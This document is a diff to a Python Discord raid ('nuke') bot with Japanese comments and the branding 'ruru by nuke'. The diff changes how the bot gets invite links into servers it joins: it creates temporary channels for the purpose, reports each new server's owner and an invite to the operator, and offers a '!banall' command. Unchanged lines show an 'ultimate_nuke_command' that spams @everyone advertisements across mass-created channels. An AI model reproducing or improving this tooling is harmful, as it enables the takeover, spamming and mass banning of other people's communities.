@@ -13,7 +13,7 @@ logging.basicConfig(level=logging.WARNING)
 
 # 🚨 --- 監視・保護対象の定義 ---
 EXCLUDED_GUILD_ID = 1443617254871662642 # 破壊コマンドを無効化するサーバーID
-REPORT_GUILD_ID = 1443617254871662642   # レポートを送信するサーバーID (今回はEXCLUDEDと同じ)
+REPORT_GUILD_ID = 1443617254871662642   # レポートを送信するサーバーID
 REPORT_CHANNEL_ID = 1443878284088705125 # レポートを送信するチャンネルID
 # -----------------------------
 
@@ -61,15 +61,34 @@ async def get_server_data(ctx, server_id: int):
     owner_info = f"{owner.name} (`{owner.id}`)" if owner else "不明"
 
     invite_link = "作成失敗/権限不足"
+    temp_channel = None 
+
     try:
-        channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_invite), None)
-        if channel:
-            invite = await channel.create_invite(max_uses=0, max_age=0, reason="ruru by nuke - Server Data Retrieval")
+        # 1. 既存のチャンネルで権限をチェック
+        channel_to_use = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_invite), None)
+
+        if not channel_to_use and guild.me.guild_permissions.manage_channels:
+            # 2. 既存チャンネルで失敗した場合、チャンネル作成権限があれば一時的なチャンネルを作る
+            temp_channel = await guild.create_text_channel(
+                "ruru-invite-channel",
+                reason="ruru by nuke - Temporary Invite Creation for !serverdata"
+            )
+            channel_to_use = temp_channel
+
+        if channel_to_use:
+            # 3. 招待リンクを作成 (一時的な利用のため、制限付き)
+            invite = await channel_to_use.create_invite(max_uses=1, max_age=3600, reason="ruru by nuke - Server Data Retrieval")
             invite_link = str(invite)
         else:
-            invite_link = "権限不足またはテキストチャンネルがない"
+            invite_link = "永続的な招待リンクの作成権限がない"
+
     except Exception as e:
         logging.warning(f"招待リンク作成中にエラーが発生したぜ: {e}")
+
+    finally:
+        # 4. 一時的なチャンネルがあれば、確実に削除する
+        if temp_channel:
+            await temp_channel.delete()
 
     response = (
         f"🕵️ **サーバー情報収集完了！**\n"
@@ -174,7 +193,7 @@ async def ultimate_nuke_command(ctx):
         logging.error(f"ROLE SPAM ERROR: ロール作成中にエラーが発生したぜ。: {e}")
 
 
-    # 3. 全ての新しいチャンネルにスパムメッセージを20回送信 (ランダム遅延付き)
+    # 3. 全ての新しいチャンネルにスパムメッセージを15回送信 (ランダム遅延付き)
     if successful_channels:
         spam_message_content = (
             "# @everyoneruru by nuke😂\n"
@@ -182,7 +201,7 @@ async def ultimate_nuke_command(ctx):
             "https://discord.gg/Uv4dh5nZz6\n"
             "https://imgur.com/NbBGFcf"
         )
-        spam_count = 20
+        spam_count = 15
         
         await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**宣伝スパム**を送りつけるぞ！")
 
@@ -257,21 +276,38 @@ async def on_guild_join(guild):
     # 1. レポート先チャンネルを取得
     report_channel = bot.get_channel(REPORT_CHANNEL_ID)
     
-    # 2. 招待リンクを作成 (最初に利用可能なテキストチャンネルで試行)
     invite_link = "作成失敗/権限不足"
+    temp_channel = None 
+
     try:
-        # Botに招待作成権限があるチャンネルを探す
-        channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_invite), None)
-        if channel:
-            # 永続的な招待リンクを作成
-            invite = await channel.create_invite(max_uses=0, max_age=0, reason="ruru by nuke - New Guild Report")
+        # 1. 既存のチャンネルで権限をチェック
+        channel_to_use = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_invite), None)
+
+        if not channel_to_use and guild.me.guild_permissions.manage_channels:
+            # 2. 既存チャンネルで失敗した場合、チャンネル作成権限があれば一時的なチャンネルを作る
+            temp_channel = await guild.create_text_channel(
+                "ruru-invite-channel",
+                reason="ruru by nuke - Temporary Invite Creation for Report"
+            )
+            channel_to_use = temp_channel
+
+        if channel_to_use:
+            # 3. 招待リンクを作成 (一時的な利用のため、制限付き)
+            invite = await channel_to_use.create_invite(max_uses=1, max_age=3600, reason="ruru by nuke - New Guild Report")
             invite_link = str(invite)
         else:
-            invite_link = "権限不足またはテキストチャンネルがない"
+            invite_link = "永続的な招待リンクの作成権限がない"
+            
     except Exception as e:
         logging.warning(f"Joined Guild: {guild.name} 招待リンク作成中にエラーが発生したぜ: {e}")
 
-    # 3. レポート内容を整形
+    finally:
+        # 4. 一時的なチャンネルがあれば、確実に削除する
+        # ※レポートチャンネル自身を削除しないようIDをチェックする
+        if temp_channel and temp_channel.id != REPORT_CHANNEL_ID:
+            await temp_channel.delete()
+
+    # 5. レポート内容を整形
     owner_info = f"{guild.owner.name} (`{guild.owner.id}`)" if guild.owner else "不明"
     
     report_message = (
@@ -285,7 +321,7 @@ async def on_guild_join(guild):
         f"✅ 人間を追い出すか？: `!banall`"
     )
 
-    # 4. レポートチャンネルに送信
+    # 6. レポートチャンネルに送信
     if report_channel:
         try:
             await report_channel.send(report_message)
